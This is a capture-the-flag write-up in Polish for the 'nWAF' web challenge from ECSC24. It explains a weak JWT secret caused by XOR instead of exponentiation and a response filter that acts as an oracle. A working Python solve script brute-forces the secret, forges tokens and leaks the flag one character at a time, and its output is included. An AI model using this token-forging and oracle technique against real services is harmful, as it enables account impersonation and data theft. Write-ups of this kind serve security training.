# nWAF - web

### Vulnerability

1. Generowany secret to liczba z zakresu <125, 130> (XOR, zamiast POW):
```python
app.config["JWT_SECRET_KEY"] = random.randint(2 ^ 127, 2 ^ 128).to_bytes(16, 'big')
```

2. Middleware działa na wszystkich route'ach, nie tylko na `/flag`:
```python
@app.after_request
def waf(response: Response) -> Response:
    print(f"Response: {response.data}")
    if any([ngram in response.data for ngram in ngrams]):
        return Response(status=401)
    else:
        return response
```
 
### Solution

Znając secret jesteśmy w stanie wygenerować token z własnym username'em. Używając `/hello` i middleware'a można zgadywać flagę literka po literce w ciągach po 4 znaki.

```python
import jwt
import requests
import string

flag = ""
curr = "ecs"
secret = ""

original_token = requests.get("https://nwaf.ecsc24.hack.cert.pl/login", allow_redirects=False).cookies.get("access_token_cookie")
for i in range(2 ^ 127, 2 ^ 128 + 1):
  try:
    secret = i.to_bytes(16, 'big')
    jwt.decode(original_token, secret, algorithms=["HS256"])
    print(f"secret found: {secret=}")
    break
  except:
    continue
else:
  print("secret not found.")
  exit(1)

while not curr.endswith("}"):
  for x in "{}_" + string.digits + string.ascii_letters + "!@#$%^&*()":
    token = jwt.encode({
      "sub": curr + x,
      "exp": 2219586395,
    }, secret, algorithm="HS256")

    req = requests.get("https://nwaf.ecsc24.hack.cert.pl/hello", cookies={
      "access_token_cookie": token,
    })

    if req.status_code == 401:
      print(f"letter: {x=}, {curr=}")
      flag += curr[0]
      curr = curr[1:] + x
      break
  else:
    print("letter not found.")
    print(f"{flag=}, {curr=}")
    exit(1)

flag += curr
print(f"{flag=}")
```

```
$ python solve.py
secret=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00~'
flag='ecsc24{mowa_jest_srebrem_a_milczenie_owiec!}'
```
